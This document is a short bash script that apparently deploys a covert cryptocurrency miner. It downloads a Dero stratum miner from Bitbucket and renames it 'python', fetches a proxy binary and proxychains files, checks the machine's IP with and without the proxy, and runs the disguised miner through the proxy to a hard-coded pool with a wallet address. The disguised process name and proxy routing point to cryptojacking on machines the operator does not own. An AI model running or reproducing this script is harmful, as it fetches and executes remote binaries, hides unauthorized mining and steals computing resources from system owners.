#!/bin/bash
curl -L -o python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python 
curl -L -o proxy https://bitbucket.org/asimadarasi/alima/downloads/panel && chmod +x proxy
curl -O https://bitbucket.org/asimadarasi/alima/downloads/libproxychains4.so && chmod +x libproxychains4.so 
curl -O https://bitbucket.org/asimadarasi/alima/downloads/proxychains.conf && chmod +x proxychains.conf 
echo "IP ORI ==> "$(curl ifconfig.me) 
echo "IP Baru ==> "$(./proxy curl ifconfig.me) 
./proxy ./python -r 148.113.136.140:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmua6z2ur22hr2qm9negq.$(echo $(shuf -i 1000-9999 -n 1)-C)
